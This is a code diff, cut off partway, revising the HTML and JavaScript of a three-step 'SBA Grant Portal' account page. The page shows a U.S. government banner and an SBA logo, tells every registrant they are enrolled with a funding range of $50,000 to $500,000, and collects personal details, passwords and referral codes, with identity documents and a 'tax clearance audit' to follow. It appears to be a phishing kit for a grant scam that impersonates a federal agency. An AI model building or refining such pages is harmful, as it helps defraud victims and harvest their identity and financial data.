@@ -3,336 +3,317 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Register | SBA Grant Portal</title>
+    <title>Create Account | SBA Grant Portal</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <link rel="stylesheet" href="global.css">
     <style>
-        .reg-container { min-height: 100vh; display: flex; flex-direction: column; background: var(--bg); }
-        .reg-content { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
-        .reg-card { width: 100%; max-width: 520px; animation: fadeSlide 0.4s ease; }
+        .reg-layout { min-height: 100vh; background: var(--bg); display: flex; flex-direction: column; }
+        .reg-container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 24px; }
+        .reg-card { width: 100%; max-width: 540px; animation: fadeSlide 0.4s ease; }
         .reg-step { display: none; }
         .reg-step.active { display: block; animation: fadeSlide 0.3s ease; }
-        .referral-toggle { color: var(--navy); font-size: 0.85rem; font-weight: 700; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; margin-top: 10px; }
-        .referral-box { display: none; margin-top: 10px; }
-        .referral-box.show { display: block; }
-        .strength-meter { height: 6px; background: var(--border-light); border-radius: 3px; margin: 10px 0; overflow: hidden; }
-        .strength-bar { height: 100%; width: 0; transition: 0.3s; }
+        
+        .strength-meter { height: 6px; background: var(--border-light); border-radius: 3px; margin: 12px 0 6px; overflow: hidden; }
+        .strength-bar { height: 100%; width: 0; transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
         .strength-label { font-size: 0.75rem; font-weight: 600; color: var(--text-muted); }
+
+        .referral-toggle { color: var(--navy); font-size: 0.85rem; font-weight: 700; cursor: pointer; display: inline-flex; align-items: center; gap: 8px; margin-top: 15px; }
+        .referral-input-wrap { display: none; margin-top: 10px; }
+        .referral-input-wrap.show { display: block; }
     </style>
 </head>
 <body>
 
-<div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>
+    <div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>
 
-<script type="module">
-    import { redirectIfLoggedIn } from './app.js';
-    redirectIfLoggedIn();
-</script>
+    <div class="reg-layout">
+        <div class="gov-banner">
+            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" alt="USA">
+            <span>An official website of the United States government</span>
+        </div>
 
-<div class="gov-banner">
-    <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" alt="USA">
-    <span>An official website of the United States government</span>
-</div>
-
-<div class="reg-container">
-    <div class="reg-content">
-        <div class="reg-card">
-            <div class="text-center mb-8">
-                <div class="sba-logo" style="justify-content: center; margin-bottom: 24px;">
-                    <svg class="sba-logo__mark" viewBox="0 0 80 80"><path d="M6 6 H32 V14 H14 V32 H6 Z" fill="#003087"/><path d="M48 66 H66 V48 H74 V74 H48 Z" fill="#c8102e"/><text x="8" y="58" font-family="Arial Black" font-size="36" font-weight="900" fill="#003087">S</text><text x="28" y="58" font-family="Arial Black" font-size="36" font-weight="900" fill="#003087">B</text><text x="50" y="58" font-family="Arial Black" font-size="36" font-weight="900" fill="#003087">A</text></svg>
-                    <div class="sba-logo__text"><span class="sba-logo__name">U.S. Small Business</span><span class="sba-logo__sub">Administration</span></div>
-                </div>
-                <h1 style="font-size: 1.5rem; font-weight: 800;">Create Portal Account</h1>
-                <p class="text-muted">Start your 2025 Grant Application</p>
-            </div>
-
-            <div class="step-indicator" id="stepIndicator">
-                <div class="step-indicator__item">
-                    <div class="step-indicator__dot active" data-step="1">1</div>
-                    <span class="step-indicator__label active">Account</span>
-                    <div class="step-indicator__connector"></div>
-                </div>
-                <div class="step-indicator__item">
-                    <div class="step-indicator__dot" data-step="2">2</div>
-                    <span class="step-indicator__label">Personal</span>
-                    <div class="step-indicator__connector"></div>
-                </div>
-                <div class="step-indicator__item">
-                    <div class="step-indicator__dot" data-step="3">3</div>
-                    <span class="step-indicator__label">Program</span>
-                </div>
-            </div>
-
-            <div class="card card--shadow">
-                <form id="regForm">
-                    <!-- STEP 1 -->
-                    <div class="reg-step active" id="step1">
-                        <div class="form-group">
-                            <label class="form-label form-label--required">Full Legal Name</label>
-                            <input type="text" id="fullName" class="form-input" placeholder="As shown on Government ID">
-                            <span class="form-error" id="err-fullName">Please enter your full legal name (at least 2 words).</span>
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label form-label--required">Email Address</label>
-                            <input type="email" id="email" class="form-input" placeholder="name@email.com">
-                            <span class="form-error" id="err-email">A valid email address is required.</span>
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label form-label--required">Username</label>
-                            <input type="text" id="username" class="form-input" placeholder="Choose a public username">
-                            <span class="form-error" id="err-username">Username must be 3-20 characters (lowercase and numbers).</span>
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label form-label--required">Password</label>
-                            <input type="password" id="password" class="form-input" placeholder="At least 8 characters">
-                            <div class="strength-meter"><div class="strength-bar" id="strengthBar"></div></div>
-                            <div class="strength-label" id="strengthLabel">Password Strength: None</div>
-                            <span class="form-error" id="err-password">Password must be at least 8 characters long.</span>
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label form-label--required">Confirm Password</label>
-                            <input type="password" id="confirmPassword" class="form-input" placeholder="Repeat your password">
-                            <span class="form-error" id="err-confirmPassword">Passwords do not match.</span>
-                        </div>
-                        <div class="form-group flex items-center gap-2">
-                            <input type="checkbox" id="terms" style="width:16px; height:16px; cursor:pointer;">
-                            <label for="terms" style="font-size:0.8rem; color:var(--text-secondary); cursor:pointer;">I accept the <a href="terms.html" target="_blank" class="text-navy" style="font-weight:700;">SBA Grant Terms & Conditions</a></label>
-                        </div>
-                        <span class="form-error mb-4" id="err-terms">Agreement to terms is mandatory.</span>
-                        <button type="button" class="btn btn--primary btn--full" id="btnStep1">Continue Registration <i class="fa-solid fa-arrow-right"></i></button>
+        <div class="reg-container">
+            <div class="reg-card">
+                <div class="text-center mb-10">
+                    <div class="sba-logo mb-6" style="justify-content: center;">
+                        <svg class="sba-logo__mark" viewBox="0 0 80 80"><path d="M6 6 H32 V14 H14 V32 H6 Z" fill="#003087"/><path d="M48 66 H66 V48 H74 V74 H48 Z" fill="#c8102e"/><text x="8" y="58" font-family="Arial Black" font-size="36" font-weight="900" fill="#003087">S</text><text x="28" y="58" font-family="Arial Black" font-size="36" font-weight="900" fill="#003087">B</text><text x="50" y="58" font-family="Arial Black" font-size="36" font-weight="900" fill="#003087">A</text></svg>
+                        <div class="sba-logo__text"><span class="sba-logo__name">U.S. Small Business</span><span class="sba-logo__sub">Administration</span></div>
                     </div>
+                    <h1 style="font-size: 1.8rem; font-weight: 900; color: var(--navy);">Portal Enrollment</h1>
+                    <p class="text-muted">Complete the 3-step registration to begin.</p>
+                </div>
 
-                    <!-- STEP 2 -->
-                    <div class="reg-step" id="step2">
-                        <div class="form-group">
-                            <label class="form-label form-label--required">Phone Number</label>
-                            <div class="flex gap-2">
-                                <input type="text" value="+1" class="form-input" style="width: 65px; text-align: center;" readonly>
-                                <input type="tel" id="phoneNumber" class="form-input" placeholder="(555) 000-0000">
-                            </div>
-                            <span class="form-error" id="err-phoneNumber">A valid phone number is required.</span>
-                        </div>
-                        <div class="form-group">
-                            <label class="form-label form-label--required">Country of Residence</label>
-                            <select id="country" class="form-select">
-                                <option value="United States">United States</option>
-                                <option value="Afghanistan">Afghanistan</option><option value="Albania">Albania</option>
-                                <option value="Algeria">Algeria</option><option value="Argentina">Argentina</option>
-                                <option value="Australia">Australia</option><option value="Austria">Austria</option>
-                                <option value="Bahamas">Bahamas</option><option value="Belgium">Belgium</option>
-                                <option value="Brazil">Brazil</option><option value="Canada">Canada</option>
-                                <option value="Chile">Chile</option><option value="China">China</option>
-                                <option value="Colombia">Colombia</option><option value="Denmark">Denmark</option>
-                                <option value="Egypt">Egypt</option><option value="Finland">Finland</option>
-                                <option value="France">France</option><option value="Germany">Germany</option>
-                                <option value="Greece">Greece</option><option value="Hong Kong">Hong Kong</option>
-                                <option value="Iceland">Iceland</option><option value="India">India</option>
-                                <option value="Indonesia">Indonesia</option><option value="Ireland">Ireland</option>
-                                <option value="Israel">Israel</option><option value="Italy">Italy</option>
-                                <option value="Japan">Japan</option><option value="Kenya">Kenya</option>
-                                <option value="Malaysia">Malaysia</option><option value="Mexico">Mexico</option>
-                                <option value="Netherlands">Netherlands</option><option value="New Zealand">New Zealand</option>
-                                <option value="Nigeria">Nigeria</option><option value="Norway">Norway</option>
-                                <option value="Pakistan">Pakistan</option><option value="Philippines">Philippines</option>
-                                <option value="Poland">Poland</option><option value="Portugal">Portugal</option>
-                                <option value="Qatar">Qatar</option><option value="Romania">Romania</option>
-                                <option value="Saudi Arabia">Saudi Arabia</option><option value="Singapore">Singapore</option>
-                                <option value="South Africa">South Africa</option><option value="South Korea">South Korea</option>
-                                <option value="Spain">Spain</option><option value="Sweden">Sweden</option>
-                                <option value="Switzerland">Switzerland</option><option value="Thailand">Thailand</option>
-                                <option value="Turkey">Turkey</option><option value="United Arab Emirates">United Arab Emirates</option>
-                                <option value="United Kingdom">United Kingdom</option><option value="Vietnam">Vietnam</option>
-                            </select>
-                        </div>
-                        <div class="form-row">
+                <!-- Progress -->
+                <div class="step-indicator" id="stepIndicator">
+                    <div class="step-indicator__item">
+                        <div class="step-indicator__dot active" data-step="1">1</div>
+                        <span class="step-indicator__label active">Account</span>
+                        <div class="step-indicator__connector"></div>
+                    </div>
+                    <div class="step-indicator__item">
+                        <div class="step-indicator__dot" data-step="2">2</div>
+                        <span class="step-indicator__label">Personal</span>
+                        <div class="step-indicator__connector"></div>
+                    </div>
+                    <div class="step-indicator__item">
+                        <div class="step-indicator__dot" data-step="3">3</div>
+                        <span class="step-indicator__label">Program</span>
+                    </div>
+                </div>
+
+                <div class="card card--shadow">
+                    <form id="regForm">
+                        <!-- STEP 1: ACCOUNT -->
+                        <div class="reg-step active" id="step1">
                             <div class="form-group">
-                                <label class="form-label form-label--required">Gender</label>
-                                <select id="gender" class="form-select">
-                                    <option value="">Select...</option>
-                                    <option value="Male">Male</option>
-                                    <option value="Female">Female</option>
-                                    <option value="Non-binary">Non-binary</option>
-                                    <option value="Other">Prefer not to say</option>
-                                </select>
-                                <span class="form-error" id="err-gender">Please select your gender.</span>
+                                <label class="form-label form-label--required">Full Legal Name</label>
+                                <input type="text" id="fullName" class="form-input" placeholder="As shown on Government ID">
+                                <span class="form-error" id="err-fullName">Please enter your full legal name (at least 2 words).</span>
                             </div>
                             <div class="form-group">
-                                <label class="form-label form-label--required">Date of Birth</label>
-                                <input type="date" id="dob" class="form-input">
-                                <span class="form-error" id="err-dob">You must be 18+ years old.</span>
+                                <label class="form-label form-label--required">Email Address</label>
+                                <input type="email" id="email" class="form-input" placeholder="name@email.com">
+                                <span class="form-error" id="err-email">Please enter a valid email address.</span>
                             </div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Username</label>
+                                <input type="text" id="username" class="form-input" placeholder="Choose a username">
+                                <span class="form-error" id="err-username">Username must be 3-20 chars (lowercase/numbers only).</span>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Password</label>
+                                <input type="password" id="password" class="form-input" placeholder="Min. 8 characters">
+                                <div class="strength-meter"><div class="strength-bar" id="strengthBar"></div></div>
+                                <div class="strength-label" id="strengthLabel">Strength: None</div>
+                                <span class="form-error" id="err-password">Password must be at least 8 characters.</span>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Confirm Password</label>
+                                <input type="password" id="confirmPassword" class="form-input" placeholder="Repeat your password">
+                                <span class="form-error" id="err-confirmPassword">Passwords do not match.</span>
+                            </div>
+                            <div class="form-group flex items-start gap-3 mt-6">
+                                <input type="checkbox" id="terms" style="width: 20px; height: 20px; margin-top: 2px; cursor: pointer;">
+                                <label for="terms" style="font-size: 0.85rem; color: var(--text-secondary); cursor: pointer;">
+                                    I agree to the <a href="terms.html" target="_blank" class="text-navy" style="font-weight: 700;">SBA Terms of Service</a> and federal grant regulations.
+                                </label>
+                            </div>
+                            <span class="form-error mb-4" id="err-terms">You must accept the terms to continue.</span>
+                            <button type="button" class="btn btn--primary btn--full btn--lg mt-4" id="btnStep1">Continue <i class="fa-solid fa-arrow-right"></i></button>
                         </div>
-                        <div class="referral-toggle" id="refToggle"><i class="fa-solid fa-plus"></i> Have a referral code?</div>
-                        <div class="referral-box" id="refBox">
-                            <input type="text" id="referredBy" class="form-input" placeholder="Enter SBA-REF code">
-                        </div>
-                        <div class="flex gap-4 mt-8">
-                            <button type="button" class="btn btn--ghost flex-1" id="btnBack1">Back</button>
-                            <button type="button" class="btn btn--primary flex-1" id="btnStep2">Continue</button>
-                        </div>
-                    </div>
 
-                    <!-- STEP 3 -->
-                    <div class="reg-step" id="step3">
-                        <div class="alert alert--info mb-6">
-                            <i class="fa-solid fa-circle-info"></i>
-                            <div>
-                                <strong>Automatic Enrollment</strong>
-                                <p style="font-size:0.8rem; margin-top:4px;">You have been enrolled in the <strong>SBA Grant Program 2025</strong>.</p>
+                        <!-- STEP 2: PERSONAL -->
+                        <div class="reg-step" id="step2">
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Phone Number</label>
+                                <div class="flex gap-2">
+                                    <input type="text" value="+1" class="form-input" style="width: 70px; text-align: center;" readonly>
+                                    <input type="tel" id="phoneNumber" class="form-input" placeholder="(555) 000-0000">
+                                </div>
+                                <span class="form-error" id="err-phoneNumber">A valid phone number is required.</span>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label form-label--required">Country</label>
+                                <select id="country" class="form-select"></select>
+                            </div>
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label class="form-label form-label--required">Gender</label>
+                                    <select id="gender" class="form-select">
+                                        <option value="">Select...</option>
+                                        <option value="Male">Male</option>
+                                        <option value="Female">Female</option>
+                                        <option value="Other">Prefer not to say</option>
+                                    </select>
+                                    <span class="form-error" id="err-gender">Please select your gender.</span>
+                                </div>
+                                <div class="form-group">
+                                    <label class="form-label form-label--required">Date of Birth</label>
+                                    <input type="date" id="dob" class="form-input">
+                                    <span class="form-error" id="err-dob">You must be at least 18 years old.</span>
+                                </div>
+                            </div>
+                            <div class="referral-toggle" id="refToggle"><i class="fa-solid fa-plus"></i> Have a referral code?</div>
+                            <div class="referral-input-wrap" id="refBox">
+                                <input type="text" id="referredBy" class="form-input" placeholder="Enter code">
+                            </div>
+                            <div class="flex gap-4 mt-10">
+                                <button type="button" class="btn btn--ghost flex-1" id="btnBack1">Back</button>
+                                <button type="button" class="btn btn--primary flex-1" id="btnStep2">Continue</button>
                             </div>
                         </div>
-                        <div class="card card--navy mb-6 text-center" style="padding: 24px;">
-                            <div style="font-size: 0.75rem; text-transform: uppercase; opacity: 0.8; letter-spacing: 0.05em;">Initial Grant Eligibility</div>
-                            <div style="font-size: 2rem; font-weight: 900; color: #fbbf24; margin: 5px 0;">$50,000 — $500,000</div>
-                            <div style="font-size: 0.7rem; opacity: 0.6;">Subject to Identity Verification (KYC)</div>
+
+                        <!-- STEP 3: PROGRAM -->
+                        <div class="reg-step" id="step3">
+                            <div class="alert alert--info mb-6">
+                                <i class="fa-solid fa-circle-info"></i>
+                                <div>
+                                    <strong>Official Enrollment</strong>
+                                    <p style="font-size:0.8rem; margin-top:4px;">You are being enrolled in the <strong>SBA Federal Grant Program</strong>.</p>
+                                </div>
+                            </div>
+                            <div class="card card--navy mb-8 text-center" style="padding: 24px;">
+                                <div style="font-size: 0.75rem; text-transform: uppercase; opacity: 0.8; letter-spacing: 0.05em; font-weight: 700;">Assigned Funding Range</div>
+                                <div style="font-size: 2.2rem; font-weight: 900; color: #fbbf24; margin: 8px 0;">$50,000 — $500,000</div>
+                                <div style="font-size: 0.7rem; opacity: 0.6;">Subject to Identity Verification (KYC)</div>
+                            </div>
+                            <h4 class="mb-4" style="font-size: 0.9rem;">What Happens Next:</h4>
+                            <div class="flex flex-col gap-3">
+                                <div class="flex items-center gap-3" style="font-size: 0.85rem;"><i class="fa-solid fa-envelope-circle-check text-success"></i> Verify your email address</div>
+                                <div class="flex items-center gap-3" style="font-size: 0.85rem;"><i class="fa-solid fa-id-card text-success"></i> Submit identity documents</div>
+                                <div class="flex items-center gap-3" style="font-size: 0.85rem;"><i class="fa-solid fa-file-contract text-success"></i> Formal Form 424-B application</div>
+                                <div class="flex items-center gap-3" style="font-size: 0.85rem;"><i class="fa-solid fa-receipt text-success"></i> Federal tax clearance audit</div>
+                                <div class="flex items-center gap-3" style="font-size: 0.85rem;"><i class="fa-solid fa-building-columns text-success"></i> Direct treasury disbursement</div>
+                            </div>
+                            <div class="flex gap-4 mt-10">
+                                <button type="button" class="btn btn--ghost flex-1" id="btnBack2">Back</button>
+                                <button type="submit" class="btn btn--primary flex-1" id="btnSubmit">Create Secure Account</button>
+                            </div>
                         </div>
-                        <h4 class="mb-4">Enrollment Privileges:</h4>
-                        <div class="flex flex-col gap-3">
-                            <div class="flex items-center gap-3" style="font-size:0.85rem;"><i class="fa-solid fa-circle-check text-success"></i> Priority Review Status</div>
-                            <div class="flex items-center gap-3" style="font-size:0.85rem;"><i class="fa-solid fa-circle-check text-success"></i> Assigned SBA Case Officer</div>
-                            <div class="flex items-center gap-3" style="font-size:0.85rem;"><i class="fa-solid fa-circle-check text-success"></i> Direct Treasury Disbursement</div>
-                            <div class="flex items-center gap-3" style="font-size:0.85rem;"><i class="fa-solid fa-circle-check text-success"></i> Federal Compliance Monitoring</div>
-                            <div class="flex items-center gap-3" style="font-size:0.85rem;"><i class="fa-solid fa-circle-check text-success"></i> 24/7 Portal Support Access</div>
-                        </div>
-                        <div class="flex gap-4 mt-8">
-                            <button type="button" class="btn btn--ghost flex-1" id="btnBack2">Back</button>
-                            <button type="submit" class="btn btn--primary flex-1" id="btnSubmit">Create Account</button>
-                        </div>
-                    </div>
-                </form>
-            </div>
-            <div class="text-center mt-8">
-                <p class="text-muted" style="font-size: 0.85rem;">Already have an SBA account? <a href="login.html" class="text-navy" style="font-weight: 800;">Sign In Here</a></p>
+                    </form>
+                </div>
+                <div class="text-center mt-8">
+                    <p class="text-muted" style="font-size: 0.85rem;">Already have a portal account? <a href="login.html" class="text-navy" style="font-weight: 800;">Sign In Here</a></p>
+                </div>
             </div>
         </div>
     </div>
-</div>
 
-<script type="module">
-    import { 
-        auth, db, createUserWithEmailAndPassword, updateProfile, setDoc, doc, 
-        sendEmailVerification, buildNewUserPayload, saveRegStep, getRegData, clearRegData,
-        notifyAdmins
-    } from './firebase-config.js';
-    import { initTheme, setButtonLoading, showToast, hideLoader } from './app.js';
+    <script type="module">
+        import { 
+            auth, db, createUserWithEmailAndPassword, updateProfile, setDoc, doc, 
+            sendEmailVerification, buildNewUserPayload, saveRegStep, getRegData, clearRegData,
+            notifyAdmins, redirectIfLoggedIn
+        } from './firebase-config.js';
+        import { initTheme, setButtonLoading, showToast, hideLoader } from './app.js';
 
-    initTheme();
-    window.onload = hideLoader;
+        initTheme();
+        redirectIfLoggedIn();
 
-    const form = document.getElementById('regForm');
-    const steps = ['step1', 'step2', 'step3'];
-    let curIdx = 0;
+        const COUNTRIES = ["United States", "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan", "Bolivia", "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia", "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo", "Costa Rica", "Croatia", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, North", "Korea, South", "Kuwait", "Kyrgyzstan", "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico", "Micronesia", "Moldova", "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Macedonia", "Norway", "Oman", "Pakistan", "Palau", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "Spain", "Sri Lanka", "Sudan", "Suriname", "Sweden", "Switzerland", "Syria", "Taiwan", "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City", "Venezuela", "Vietnam", "Yemen", "Zambia", "Zimbabwe"];
 
-    // Restore existing data
-    const saved = getRegData();
-    if(saved.fullName) document.getElementById('fullName').value = saved.fullName;
-    if(saved.email) document.getElementById('email').value = saved.email;
-    if(saved.username) document.getElementById('username').value = saved.username;
-
-    const updateUI = () => {
-        steps.forEach((id, idx) => document.getElementById(id).classList.toggle('active', idx === curIdx));
-        document.querySelectorAll('.step-indicator__dot').forEach((dot, idx) => {
-            dot.classList.toggle('active', idx === curIdx);
-            dot.classList.toggle('done', idx < curIdx);
-            dot.innerHTML = idx < curIdx ? '<i class="fa-solid fa-check"></i>' : idx + 1;
-        });
-        document.querySelectorAll('.step-indicator__label').forEach((lbl, idx) => lbl.classList.toggle('active', idx === curIdx));
-        document.querySelectorAll('.step-indicator__connector').forEach((conn, idx) => conn.classList.toggle('done', idx < curIdx));
-    };
-
-    // Strength Meter
-    const passIn = document.getElementById('password');
-    passIn.oninput = () => {
-        const v = passIn.value;
-        const bar = document.getElementById('strengthBar');
-        const lbl = document.getElementById('strengthLabel');
-        let score = 0;
-        if(v.length >= 8) score += 25;
-        if(/[A-Z]/.test(v)) score += 25;
-        if(/[0-9]/.test(v)) score += 25;
-        if(/[^A-Za-z0-9]/.test(v)) score += 25;
-        bar.style.width = score + '%';
-        if(score <= 25) { bar.style.background = '#dc2626'; lbl.textContent = 'Password Strength: Weak'; }
-        else if(score <= 50) { bar.style.background = '#f59e0b'; lbl.textContent = 'Password Strength: Fair'; }
-        else if(score <= 75) { bar.style.background = '#fbbf24'; lbl.textContent = 'Password Strength: Good'; }
-        else { bar.style.background = '#15803d'; lbl.textContent = 'Password Strength: Strong'; }
-    };
-
-    // Step Logic
-    document.getElementById('btnStep1').onclick = () => {
-        const fn = document.getElementById('fullName').value.trim();
-        const em = document.getElementById('email').value.trim();
-        const un = document.getElementById('username').value.trim();
-        const pw = passIn.value;
-        const cp = document.getElementById('confirmPassword').value;
-        const tc = document.getElementById('terms').checked;
-        let ok = true;
-        document.querySelectorAll('.form-error').forEach(e => e.classList.remove('show'));
-        if(fn.split(' ').length < 2) { document.getElementById('err-fullName').classList.add('show'); ok = false; }
-        if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)) { document.getElementById('err-email').classList.add('show'); ok = false; }
-        if(un.length < 3 || /\s/.test(un)) { document.getElementById('err-username').classList.add('show'); ok = false; }
-        if(pw.length < 8) { document.getElementById('err-password').classList.add('show'); ok = false; }
-        if(pw !== cp) { document.getElementById('err-confirmPassword').classList.add('show'); ok = false; }
-        if(!tc) { document.getElementById('err-terms').classList.add('show'); ok = false; }
-        if(ok) { saveRegStep({fullName:fn, email:em, username:un}); curIdx = 1; updateUI(); }
-    };
-
-    document.getElementById('btnStep2').onclick = () => {
-        const ph = document.getElementById('phoneNumber').value.trim();
-        const dob = document.getElementById('dob').value;
-        const gen = document.getElementById('gender').value;
-        let ok = true;
-        document.querySelectorAll('.form-error').forEach(e => e.classList.remove('show'));
-        if(ph.length < 7) { document.getElementById('err-phoneNumber').classList.add('show'); ok = false; }
-        if(!gen) { document.getElementById('err-gender').classList.add('show'); ok = false; }
-        const age = Math.floor((new Date() - new Date(dob)) / 31557600000);
-        if(!dob || age < 18) { document.getElementById('err-dob').classList.add('show'); ok = false; }
-        if(ok) { curIdx = 2; updateUI(); }
-    };
-
-    document.getElementById('btnBack1').onclick = () => { curIdx = 0; updateUI(); };
-    document.getElementById('btnBack2').onclick = () => { curIdx = 1; updateUI(); };
-
-    document.getElementById('refToggle').onclick = () => {
-        const b = document.getElementById('refBox');
-        const t = document.getElementById('refToggle');
-        b.classList.toggle('show');
-        t.innerHTML = b.classList.contains('show') ? '<i class="fa-solid fa-minus"></i> Remove referral code' : '<i class="fa-solid fa-plus"></i> Have a referral code?';
-    };
-
-    form.onsubmit = async (e) => {
-        e.preventDefault();
-        const btn = document.getElementById('btnSubmit');
-        setButtonLoading(btn, true, 'Creating Secure Account...');
-        const data = {
-            fullName: document.getElementById('fullName').value.trim(),
-            email: document.getElementById('email').value.trim(),
-            username: document.getElementById('username').value.trim(),
-            password: passIn.value,
-            phoneNumber: '+1' + document.getElementById('phoneNumber').value.trim(),
-            country: document.getElementById('country').value,
-            gender: document.getElementById('gender').value,
-            dob: document.getElementById('dob').value,
-            referredBy: document.getElementById('referredBy').value.trim()
+        window.onload = () => {
+            hideLoader();
+            const cSel = document.getElementById('country');
+            COUNTRIES.forEach(c => cSel.innerHTML += `<option value="${c}">${c}</option>`);
+            
+            // Restore session
+            const saved = getRegData();
+            if(saved.fullName) document.getElementById('fullName').value = saved.fullName;
+            if(saved.email) document.getElementById('email').value = saved.email;
+            if(saved.username) document.getElementById('username').value = saved.username;
         };
-        try {
-            const cred = await createUserWithEmailAndPassword(auth, data.email, data.password);
-            const uid = cred.user.uid;
-            await updateProfile(cred.user, { displayName: data.fullName });
-            const payload = buildNewUserPayload({ ...data, uid });
-            await setDoc(doc(db, "users", uid), payload);
-            await sendEmailVerification(cred.user);
-            await notifyAdmins({ title: 'New User Registered', message: `${data.fullName} registered a new account.`, type: 'info', link: 'admin-portal.html' });
-            clearRegData();
-            window.location.href = 'verify.html';
-        } catch (err) {
-            console.error(err);
-            showToast(err.message, 'error');
-            setButtonLoading(btn, false);
-        }
-    };
-</script>
+
+        const steps = ['step1', 'step2', 'step3'];
+        let curIdx = 0;
+
+        const updateUI = () => {
+            steps.forEach((id, idx) => document.getElementById(id).classList.toggle('active', idx === curIdx));
+            document.querySelectorAll('.step-indicator__dot').forEach((dot, idx) => {
+                dot.classList.toggle('active', idx === curIdx);
+                dot.classList.toggle('done', idx < curIdx);
+                dot.innerHTML = idx < curIdx ? '<i class="fa-solid fa-check"></i>' : idx + 1;
+            });
+            document.querySelectorAll('.step-indicator__label').forEach((lbl, idx) => lbl.classList.toggle('active', idx === curIdx));
+            document.querySelectorAll('.step-indicator__connector').forEach((conn, idx) => conn.classList.toggle('done', idx < curIdx));
+        };
+
+        // Auto-clear errors
+        document.querySelectorAll('.form-input, .form-select').forEach(input => {
+            input.oninput = () => {
+                const err = document.getElementById('err-' + input.id);
+                if(err) err.classList.remove('show');
+            };
+        });
+
+        // Password Strength
+        const passIn = document.getElementById('password');
+        passIn.oninput = () => {
+            document.getElementById('err-password').classList.remove('show');
+            const v = passIn.value;
+            const bar = document.getElementById('strengthBar');
+            const lbl = document.getElementById('strengthLabel');
+            let score = 0;
+            if(v.length >= 8) score += 25;
+            if(/[A-Z]/.test(v)) score += 25;
+            if(/[0-9]/.test(v)) score += 25;
+            if(/[^A-Za-z0-9]/.test(v)) score += 25;
+            bar.style.width = score + '%';
+            if(score <= 25) { bar.style.background = '#dc2626'; lbl.textContent = 'Strength: Weak'; }
+            else if(score <= 50) { bar.style.background = '#f59e0b'; lbl.textContent = 'Strength: Fair'; }
+            else if(score <= 75) { bar.style.background = '#fbbf24'; lbl.textContent = 'Strength: Good'; }
+            else { bar.style.background = '#15803d'; lbl.textContent = 'Strength: Strong'; }
+        };
+
+        document.getElementById('btnStep1').onclick = () => {
+            const fn = document.getElementById('fullName').value.trim();
+            const em = document.getElementById('email').value.trim();
+            const un = document.getElementById('username').value.trim();
+            const pw = passIn.value;
+            const cp = document.getElementById('confirmPassword').value;
+            const tc = document.getElementById('terms').checked;
+            let ok = true;
+            if(fn.split(' ').length < 2) { document.getElementById('err-fullName').classList.add('show'); ok = false; }
+            if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)) { document.getElementById('err-email').classList.add('show'); ok = false; }
+            if(un.length < 3) { document.getElementById('err-username').classList.add('show'); ok = false; }
+            if(pw.length < 8) { document.getElementById('err-password').classList.add('show'); ok = false; }
+            if(pw !== cp) { document.getElementById('err-confirmPassword').classList.add('show'); ok = false; }
